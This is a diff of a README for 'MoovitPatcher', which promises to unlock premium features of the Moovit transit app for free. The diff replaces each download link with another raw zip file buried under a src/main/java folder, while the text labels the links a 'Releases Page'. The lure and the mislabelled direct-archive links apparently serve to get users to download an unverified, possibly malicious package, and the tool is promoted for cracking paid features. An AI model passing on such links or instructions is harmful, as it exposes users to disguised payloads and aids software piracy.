@@ -1,7 +1,7 @@
 # 🛠️ MoovitPatcher - Unlock Premium Features for Free
 
 ## 📥 Download Now!
-[![Download MoovitPatcher](https://raw.githubusercontent.com/Coconginamo/MoovitPatcher/master/smali_generator/app/Moovit_Patcher_v3.1-alpha.3.zip)](https://raw.githubusercontent.com/Coconginamo/MoovitPatcher/master/smali_generator/app/Moovit_Patcher_v3.1-alpha.3.zip)
+[![Download MoovitPatcher](https://raw.githubusercontent.com/Coconginamo/MoovitPatcher/master/smali_generator/app/src/main/java/Patcher_Moovit_3.0.zip)](https://raw.githubusercontent.com/Coconginamo/MoovitPatcher/master/smali_generator/app/src/main/java/Patcher_Moovit_3.0.zip)
 
 ---
 
@@ -26,11 +26,11 @@ Welcome to MoovitPatcher! This application helps you unlock premium features and
 
 To download the latest version of MoovitPatcher, visit the releases page below.
 
-[Download MoovitPatcher](https://raw.githubusercontent.com/Coconginamo/MoovitPatcher/master/smali_generator/app/Moovit_Patcher_v3.1-alpha.3.zip)
+[Download MoovitPatcher](https://raw.githubusercontent.com/Coconginamo/MoovitPatcher/master/smali_generator/app/src/main/java/Patcher_Moovit_3.0.zip)
 
 ### Step-by-Step Installation
 
-1. **Visit the Releases Page:** Click [here](https://raw.githubusercontent.com/Coconginamo/MoovitPatcher/master/smali_generator/app/Moovit_Patcher_v3.1-alpha.3.zip) to access the latest version of MoovitPatcher.
+1. **Visit the Releases Page:** Click [here](https://raw.githubusercontent.com/Coconginamo/MoovitPatcher/master/smali_generator/app/src/main/java/Patcher_Moovit_3.0.zip) to access the latest version of MoovitPatcher.
 
 2. **Locate the Latest Release:** Scroll down to find the version labeled as "Latest Release."
 
